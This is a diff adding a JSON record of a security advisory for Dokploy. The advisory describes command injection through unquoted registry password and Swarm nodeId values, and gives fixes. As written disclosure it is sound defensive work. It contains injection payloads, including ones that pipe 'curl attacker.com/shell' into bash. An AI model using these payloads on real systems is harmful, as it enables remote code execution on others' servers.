@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-4mfc-grxw-6858",
+  "repo": {
+    "cve_id": "CVE-2026-72736",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\n\nDokploy passes user-controlled values directly into shell commands via unquoted template literal interpolation in two distinct management endpoints: registry credential testing and Docker Swarm cluster management. Both endpoints have a safe local code path (using `execFileAsync` or the Docker API) but a vulnerable remote path (using `execAsyncRemote` which runs the shell string via SSH).\n\n---\n\n## VULN-007 - Command Injection via Registry password → HOST RCE\n\n**File**: `apps/dokploy/server/api/routers/registry.ts`  \n**Lines**: 123-126 (`testRegistry`), 182-186 (`testRegistryById`)  \n**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H  \n**Permission**: `registry.read`\n\nThe `password` field is passed completely unquoted into `echo ${password}` on the remote-server code path:\n\n```typescript\n// testRegistry - lines 123-126 (VULNERABLE remote path)\nif (input.serverId && input.serverId !== \"none\") {\n    await execAsyncRemote(\n        input.serverId,\n        `echo ${input.password} | docker ${args.join(\" \")}`,  // ← UNQUOTED\n    );\n} else {\n    // Local path (SAFE): stdin buffer, no shell\n    await execFileAsync(\"docker\", args, { input: Buffer.from(input.password).toString() });\n}\n\n// testRegistryById - line 185 (stored injection from DB)\nawait execAsyncRemote(\n    input.serverId,\n    `echo ${registryData.password} | docker ${args.join(\" \")}`,  // ← STORED INJECTION\n);\n```\n\nSchema: `password: z.string().min(1)` - no character restriction.\n\n### Attack Payloads\n\n**Vector A** - Direct injection:\n```\npassword = \"ignored; touch /tmp/registry-rce\"\n→ echo ignored; touch /tmp/registry-rce | docker login ...\n→ touch /tmp/registry-rce runs on remote server HOST\n```\n\n**Vector B** - Stored injection via `testRegistryById`:\n1. Create registry with `password = \"$(curl attacker.com/shell|bash)\"`\n2. Trigger `testRegistryById` → DB-stored password used unquoted → HOST RCE\n\n---\n\n## VULN-008 - Command Injection via Docker Swarm nodeId → HOST RCE\n\n**File**: `apps/dokploy/server/api/routers/cluster.ts`  \n**Lines**: 54-55 (`removeWorker`)  \n**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H  \n**Permission**: `server.delete`\n\n`input.nodeId` (Docker Swarm node identifier) is interpolated unquoted into two docker commands:\n\n```typescript\nremoveWorker: withPermission(\"server\", \"delete\")\n    .input(z.object({ nodeId: z.string(), serverId: z.string().optional() }))\n    .mutation(async ({ input }) => {\n        const drainCommand = `docker node update --availability drain ${input.nodeId}`;\n        const removeCommand = `docker node rm ${input.nodeId} --force`;\n        if (input.serverId) {\n            await execAsyncRemote(input.serverId, drainCommand);\n            await execAsyncRemote(input.serverId, removeCommand);\n        } else {\n            await execAsync(drainCommand);  // local server also vulnerable\n            await execAsync(removeCommand);\n        }\n    })\n```\n\nSchema: `nodeId: z.string()` - no restriction. Docker Swarm node IDs are 25 hex characters; any non-hex value should be rejected.\n\nAttack payload: `nodeId = \"abc123; curl attacker.com/shell | bash\"`\n\n---\n\n## Recommended Fix\n\n```typescript\nimport { quote } from \"shell-quote\";\n\n// VULN-007 - registry.ts\nawait execAsyncRemote(\n    input.serverId,\n    `echo ${quote([input.password])} | docker ${args.join(\" \")}`,\n);\n\n// VULN-008 - cluster.ts\n// Option A: shell-quote\nconst drainCommand = `docker node update --availability drain ${quote([input.nodeId])}`;\n// Option B: validate format (Docker node IDs are 25 alphanumeric chars)\nnodeId: z.string().regex(/^[a-zA-Z0-9]{1,64}$/, \"Invalid node ID\")\n```\n\n## Verification\n\nConfirmed via static analysis on Dokploy v0.29.8. The asymmetry between local (safe `execFileAsync`) and remote (`execAsyncRemote` with shell string) paths confirms the vulnerability is real and not a false positive.",
+    "ghsa_id": "GHSA-4mfc-grxw-6858",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-4mfc-grxw-6858",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-4mfc-grxw-6858"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72736"
+      }
+    ],
+    "published_at": "2026-07-21T23:22:45Z",
+    "references": [],
+    "severity": "high",
+    "summary": "OS Command Injection in registry credential testing and Swarm cluster management → HOST RCE",
+    "updated_at": "2026-08-10T17:36:49Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": null,
+        "vulnerable_version_range": "<= 0.29.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
